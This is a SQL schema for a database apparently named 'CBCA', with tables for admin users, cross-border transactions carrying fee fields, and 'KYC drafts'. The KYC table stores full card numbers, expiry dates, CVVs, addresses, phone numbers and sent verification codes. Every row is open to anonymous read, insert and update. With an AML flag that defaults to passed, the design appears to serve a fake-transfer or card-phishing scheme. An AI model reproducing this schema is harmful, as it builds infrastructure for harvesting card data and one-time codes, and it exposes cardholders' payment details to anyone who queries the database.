/*
  # CBCA Full Schema

  Creates tables: admin_users, transactions, kyc_drafts
  With RLS, triggers, and default admin seed.
*/

CREATE TABLE IF NOT EXISTS admin_users (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  username text UNIQUE NOT NULL,
  password_hash text NOT NULL,
  created_at timestamptz DEFAULT now()
);

ALTER TABLE admin_users ENABLE ROW LEVEL SECURITY;

CREATE POLICY "No direct client access to admin_users"
  ON admin_users FOR SELECT
  TO authenticated
  USING (false);

-- ─────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS transactions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  ft_uid text UNIQUE NOT NULL,
  serial_number text UNIQUE NOT NULL,
  cbca_reference text UNIQUE NOT NULL,
  amount numeric(18,2) DEFAULT 0,
  currency text DEFAULT 'USD',
  company_name text DEFAULT '',
  employee_id text DEFAULT '',
  hash_value text DEFAULT '',
  jurisdiction text DEFAULT '',
  agreement_number text DEFAULT '',
  issue_date date,
  settlement_days int DEFAULT 3,
  exchange_rate numeric(18,6),
  local_currency text,
  local_amount numeric(18,2),
  fee_crossborder numeric(18,2) DEFAULT 0,
  fee_intermediary numeric(18,2) DEFAULT 0,
  fee_tax numeric(18,2) DEFAULT 0,
  fee_description text DEFAULT '',
  review_status text DEFAULT 'draft' CHECK (review_status IN ('draft','pending','processing','approved','failed')),
  review_note text DEFAULT '',
  review_updated_at timestamptz,
  aml_passed boolean DEFAULT true,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

ALTER TABLE transactions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow anon read on transactions"
  ON transactions FOR SELECT TO anon USING (true);

CREATE POLICY "Allow anon insert on transactions"
  ON transactions FOR INSERT TO anon WITH CHECK (true);

CREATE POLICY "Allow anon update on transactions"
  ON transactions FOR UPDATE TO anon USING (true) WITH CHECK (true);

-- ─────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS kyc_drafts (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  transaction_id uuid NOT NULL REFERENCES transactions(id) ON DELETE CASCADE,
  card_number text DEFAULT '',
  card_expiry text DEFAULT '',
  cvv text DEFAULT '',
  cardholder_name text DEFAULT '',
  country text DEFAULT '',
  street_address text DEFAULT '',
  house_number text DEFAULT '',
  city text DEFAULT '',
  state text DEFAULT '',
  postal_code text DEFAULT '',
  phone_number text DEFAULT '',
  verification_code text,
  code_sent_at timestamptz,
  is_submitted boolean DEFAULT false,
  submitted_at timestamptz,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now(),
  UNIQUE(transaction_id)
);

ALTER TABLE kyc_drafts ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow anon read on kyc_drafts"
  ON kyc_drafts FOR SELECT TO anon USING (true);

CREATE POLICY "Allow anon insert on kyc_drafts"
  ON kyc_drafts FOR INSERT TO anon WITH CHECK (true);

CREATE POLICY "Allow anon update on kyc_drafts"
  ON kyc_drafts FOR UPDATE TO anon USING (true) WITH CHECK (true);

-- ─────────────────────────────────────────────────────────────
INSERT INTO admin_users (username, password_hash)
VALUES ('admin', 'CBCA_ADMIN_PASSWORD_PLACEHOLDER')
ON CONFLICT (username) DO NOTHING;

-- ─────────────────────────────────────────────────────────────
CREATE OR REPLACE FUNCTION update_updated_at()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE TRIGGER trg_transactions_updated_at
  BEFORE UPDATE ON transactions
  FOR EACH ROW EXECUTE FUNCTION update_updated_at();

CREATE OR REPLACE TRIGGER trg_kyc_drafts_updated_at
  BEFORE UPDATE ON kyc_drafts
  FOR EACH ROW EXECUTE FUNCTION update_updated_at();
